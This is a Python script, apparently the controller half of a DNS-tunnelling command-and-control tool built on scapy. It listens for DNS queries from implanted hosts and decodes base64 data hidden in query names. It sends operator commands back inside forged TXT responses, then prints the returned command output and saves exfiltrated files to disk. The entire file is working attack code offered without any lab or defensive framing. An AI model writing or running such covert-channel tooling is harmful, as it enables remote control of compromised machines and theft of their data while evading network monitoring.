#!/usr/bin/python3

from scapy.all import *
from threading import Thread, Lock, Semaphore
from base64 import *
import time

avail_cmd = Semaphore(0)
avail_print = Semaphore(1)
command = ""
msg = ""
stop = 0


def parse_end(packet):
    try:
        if('RU5E' == packet[DNS].qd[DNSQR].qname.decode('utf-8').split(".")[0]):
             return True

        return False
    except Exception as e:
        print("in parse_end")
        print(e)


def concat_msg(packet):
    try:
        global msg
        pkt_msg =packet[DNS].qd[DNSQR].qname.decode('utf-8').split(".")[0]
        msg += b64decode(pkt_msg.encode('utf-8')).decode('utf-8')
    except Exception as e:
        print("in parse_end")
        print(e)

def send_cmd(packet, command):
    try:
        dns_ip = IP(dst=packet[0][IP].src, id=packet[0][IP].id)
        dns_udp = UDP(dport=packet[0][UDP].sport, sport=53, chksum=None)
        dns_dns = DNS(id=packet[0][DNS].id, qd=packet[0][DNS].qd, an=DNSRR(rrname=packet[0][DNS].qd.qname, type='TXT', ttl=0, rdata=b64encode(command.encode('utf-8'))))
        dns_rep = dns_ip/dns_udp/dns_dns
        send(dns_rep, verbose=False)
    except Exception as e:
        print("in send_cmd: ")
        print(e)
    finally:
        return


def parse_msg(msg_lst):
    try:
        print(msg_lst)
        if(msg_lst[-2] == 'RUN'):
            print("\n".join(msg_lst[0:-2]))

        elif(msg_lst[-2] == 'FILE'):
            with open("outputfile"+str(parse_msg.counter), 'wb+') as f:
                f.write(bytearray.fromhex("".join(msg_lst[0:-2])))
            parse_msg.counter += 1
    except Exception as e:
        print("in parse_msg: ")
        print(e)

    finally:
        avail_print.release()
        return


parse_msg.counter = 1


def recieve_msg():
    try:
        global stop
        global command
        while not stop:
            global msg
            prailer = "START "
            msg = ""
            rp = sniff(filter="(udp dst port 53)",
                       prn=concat_msg, stop_filter=parse_end, timeout=100)
            msg_lst = msg.split(" ")
            if('READY' == msg_lst[0] and avail_cmd.acquire(blocking=False)):
                send_cmd(rp, prailer+command)
            elif('READY' != msg_lst[0]):
                parse_msg(msg_lst)
    except Exception as e:
        print("in recieve_msg: ")
        print(e)
    finally:
        return


def main():
    try:
        rcv_thrd = Thread(target=recieve_msg)
        rcv_thrd.start()
    except:
        print("cant start listen/response threads")

    try:
        global command
        while True:
            avail_print.acquire(timeout=60)
            command = input("Enter command: ")
            if(command == 'stop'):
                global stop
                stop = 1
                break
            avail_cmd.release()

    except Exception as e:
        print("in main: "+e)

    finally:
        rcv_thrd.join()
        return 0


if __name__ == "__main__":
    main()
